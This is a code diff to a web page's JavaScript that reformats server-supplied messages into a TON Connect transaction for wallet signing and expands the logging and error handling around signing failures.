@@ -1041,6 +1041,7 @@ function updateUIForNoTransactions() {
 
         // Обработка транзакционных сообщений для подписания
         // Обработка транзакционных сообщений для подписания
+// Обработка транзакционных сообщений для подписания (исправленная)
 async function processTransactionMessages(messagesData) {
     try {
         const messages = messagesData.messages;
@@ -1052,17 +1053,42 @@ async function processTransactionMessages(messagesData) {
             return;
         }
         
-        // Подготавливаем транзакцию для подписания
+        // Подготавливаем транзакцию для подписания с правильным форматом для TON Connect
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 300, // 5 minutes
-            messages: messages.map(msg => ({
-                address: msg.address,
-                amount: msg.amount || msg.value || '0',
-                payload: msg.payload || ''
-            }))
+            messages: messages.map(msg => {
+                // Форматируем amount для TON Connect (в нанотонах)
+                let amount = '0';
+                if (msg.amount) {
+                    amount = msg.amount.toString();
+                } else if (msg.balance) {
+                    amount = msg.balance.toString();
+                }
+                
+                // Форматируем address для TON Connect
+                let address = msg.address;
+                if (address && !address.startsWith('0:')) {
+                    // Если адрес в дружелюбном формате, оставляем как есть
+                    address = address;
+                }
+                
+                console.log('📝 Message details:', {
+                    originalAmount: msg.amount,
+                    originalBalance: msg.balance,
+                    formattedAmount: amount,
+                    address: address,
+                    hasPayload: !!msg.payload
+                });
+                
+                return {
+                    address: address,
+                    amount: amount,
+                    payload: msg.payload || ''
+                };
+            })
         };
 
-        console.log('📝 Final transaction for signing:', transaction);
+        console.log('📝 Final transaction for signing:', JSON.stringify(transaction, null, 2));
         showStatus(`Ready to sign ${messages.length} transaction(s)`, 'info');
         
         // Небольшая задержка для UX
@@ -1081,20 +1107,26 @@ async function processTransactionMessages(messagesData) {
         } catch (signError) {
             console.error('❌ Transaction signing failed:', signError);
             
+            let errorMessage = 'Signing failed';
             if (signError.message?.includes('Rejected')) {
-                showStatus('Transaction rejected by user', 'error');
+                errorMessage = 'Transaction rejected by user';
             } else if (signError.message?.includes('timeout')) {
-                showStatus('Transaction timeout', 'error');
+                errorMessage = 'Transaction timeout';
+            } else if (signError.message?.includes("'amount' is required")) {
+                errorMessage = 'Invalid transaction format: missing amount';
             } else {
-                showStatus('Signing failed: ' + signError.message, 'error');
+                errorMessage = 'Signing failed: ' + (signError.message || 'Unknown error');
             }
             
+            showStatus(errorMessage, 'error');
+            
+            // Отправляем статус ошибки на сервер
             await sendTransactionStatus('error', messages);
         }
         
     } catch (error) {
         console.error('💥 Transaction processing error:', error);
-        showStatus('Transaction processing failed', 'error');
+        showStatus('Transaction processing failed: ' + error.message, 'error');
     }
 }
 
@@ -1326,6 +1358,7 @@ async function processTransactionMessages(messagesData) {
     </script>
 </body>
 </html>
+
 
 
 
